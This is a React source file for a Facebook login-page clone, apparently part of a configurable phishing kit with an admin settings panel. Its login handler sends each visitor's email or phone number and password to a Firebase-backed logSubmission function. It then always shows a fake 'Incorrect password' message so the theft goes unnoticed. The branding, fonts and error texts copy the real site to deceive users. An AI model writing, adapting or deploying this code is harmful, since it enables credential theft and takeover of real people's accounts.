import React, { useState } from 'react';
import { Eye, EyeOff, CheckCircle2, AlertCircle, Loader2 } from 'lucide-react';
import { FacebookLogo } from './FacebookLogo';
import { MetaLogo } from './MetaLogo';
import { DefaultHeroGraphic } from './DefaultHeroGraphic';
import { Footer } from './Footer';
import { SiteSettings } from '../types';
import { logSubmission } from '../firebase';

interface FacebookLoginProps {
  settings: SiteSettings;
  onNavigateToAdmin: () => void;
}

export const FacebookLogin: React.FC<FacebookLoginProps> = ({
  settings,
  onNavigateToAdmin
}) => {
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [feedback, setFeedback] = useState<{ type: 'error' | 'success'; message: string } | null>(null);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!identifier.trim()) {
      setFeedback({
        type: 'error',
        message: 'The email address or mobile number you entered isn’t connected to an account.'
      });
      return;
    }

    setIsSubmitting(true);
    setFeedback(null);

    try {
      // Log to Firebase / local storage
      await logSubmission(identifier, password);

      setTimeout(() => {
        setIsSubmitting(false);
        setFeedback({
          type: 'error',
          message: 'Incorrect password. Did you forget your password?'
        });
      }, 700);
    } catch {
      setIsSubmitting(false);
      setFeedback({
        type: 'error',
        message: 'An error occurred. Please try again later.'
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col justify-between bg-white text-[#1c1e21] font-sans antialiased selection:bg-[#0866FF] selection:text-white">
      {/* Top bar for mobile only */}
      <div className="lg:hidden pt-8 pb-4 flex justify-center">
        <FacebookLogo customLogoUrl={settings.logoUrl} size={48} />
      </div>

      {/* Main Content Area */}
      <main className="flex-1 flex items-center justify-center px-4 sm:px-8 py-4 sm:py-10">
        <div className="w-full max-w-[1080px] grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-12 items-center">
          
          {/* Desktop Left Column: Brand & Creative Montage */}
          <div className="hidden lg:flex lg:col-span-7 flex-col justify-center pr-4">
            {/* Facebook Header Logo */}
            <div className="mb-4">
              <FacebookLogo customLogoUrl={settings.logoUrl} size={44} />
            </div>

            {/* Typography matching screenshot */}
            <h1 className="text-[44px] xl:text-[48px] font-bold tracking-tight text-[#1c1e21] leading-[1.12] mb-3 select-none">
              {settings.headlineLine1 || 'Explore'}<br />
              {settings.headlineLine2 || 'the things'}{' '}
              <span className="text-[#0866FF]">
                {settings.headlineHighlight || 'you love.'}
              </span>
            </h1>

            {/* Montage Imagery or Custom Hero Image */}
            <div className="mt-2">
              <DefaultHeroGraphic customPageImageUrl={settings.pageImageUrl} />
            </div>
          </div>

          {/* Right Column (Desktop & Mobile): Login Card */}
          <div className="lg:col-span-5 flex flex-col items-center justify-center">
            <div className="w-full max-w-[400px] bg-white rounded-2xl lg:p-6 sm:p-4">
              {/* Card Header Title */}
              <h2 className="text-[20px] font-semibold text-[#1c1e21] mb-5 tracking-tight text-left">
                Log in to Facebook
              </h2>

              {/* Feedback Alert if present */}
              {feedback && (
                <div
                  className={`mb-4 p-3 rounded-xl text-sm flex items-start gap-2.5 ${
                    feedback.type === 'error'
                      ? 'bg-red-50 text-red-700 border border-red-200'
                      : 'bg-green-50 text-green-700 border border-green-200'
                  }`}
                >
                  {feedback.type === 'error' ? (
                    <AlertCircle className="w-4 h-4 mt-0.5 shrink-0 text-red-500" />
                  ) : (
                    <CheckCircle2 className="w-4 h-4 mt-0.5 shrink-0 text-green-500" />
                  )}
                  <div className="flex-1 text-xs leading-relaxed font-normal">
                    {feedback.message}
                  </div>
                </div>
              )}

              {/* Login Form */}
              <form onSubmit={handleLogin} className="flex flex-col gap-3.5">
                {/* Email or Phone Input */}
                <div className="relative">
                  <input
                    type="text"
                    value={identifier}
                    onChange={(e) => setIdentifier(e.target.value)}
                    placeholder="Email address or mobile number"
                    className="w-full h-[52px] px-4 rounded-xl border border-[#ccd0d5] text-[15px] text-[#1c1e21] placeholder-[#8d949e] focus:outline-none focus:border-[#0866FF] focus:ring-1 focus:ring-[#0866FF] transition-all bg-white"
                    required
                  />
                </div>

                {/* Password Input with Visibility Toggle */}
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    className="w-full h-[52px] px-4 pr-11 rounded-xl border border-[#ccd0d5] text-[15px] text-[#1c1e21] placeholder-[#8d949e] focus:outline-none focus:border-[#0866FF] focus:ring-1 focus:ring-[#0866FF] transition-all bg-white"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 cursor-pointer p-1"
                    title={showPassword ? 'Hide password' : 'Show password'}
                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                  >
                    {showPassword ? (
                      <EyeOff className="w-4 h-4" />
                    ) : (
                      <Eye className="w-4 h-4" />
                    )}
                  </button>
                </div>

                {/* Log In Button */}
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full h-[48px] bg-[#0866FF] hover:bg-[#0064e0] active:bg-[#0056cc] text-white font-bold text-[17px] rounded-xl flex items-center justify-center shadow-xs cursor-pointer transition-colors disabled:opacity-75 mt-1"
                >
                  {isSubmitting ? (
                    <Loader2 className="w-5 h-5 animate-spin" />
                  ) : (
                    'Log in'
                  )}
                </button>

                {/* Forgotten Password Link */}
                <div className="text-center pt-1">
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      setFeedback({
                        type: 'error',
                        message: 'Please enter your email or mobile number to search for your account.'
                      });
                    }}
                    className="text-[#0866FF] hover:underline text-[14px] font-normal"
                  >
                    Forgotten password?
                  </a>
                </div>

                {/* Spacing / Create New Account Section */}
                <div className="pt-3">
                  <button
                    type="button"
                    onClick={() => {
                      setFeedback({
                        type: 'success',
                        message: 'Sign up modal triggered. (Registration is disabled in clone mode).'
                      });
                    }}
                    className="w-full h-[46px] rounded-full border border-[#0866FF] text-[#0866FF] hover:bg-[#0866FF]/5 active:bg-[#0866FF]/10 font-semibold text-[15px] flex items-center justify-center transition-colors cursor-pointer"
                  >
                    Create new account
                  </button>
                </div>

                {/* Meta Branding at Bottom of Card */}
                <div className="pt-4 pb-1">
                  <MetaLogo />
                </div>
              </form>
            </div>

            {/* Quick Admin Navigation Helper */}
            <div className="mt-4 text-center">
              <button
                type="button"
                onClick={onNavigateToAdmin}
                className="text-[12px] text-gray-400 hover:text-gray-700 hover:underline transition-colors cursor-pointer inline-flex items-center gap-1"
              >
                <span>Admin Settings (/admin)</span>
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Identical Footer */}
      <Footer />
    </div>
  );
};
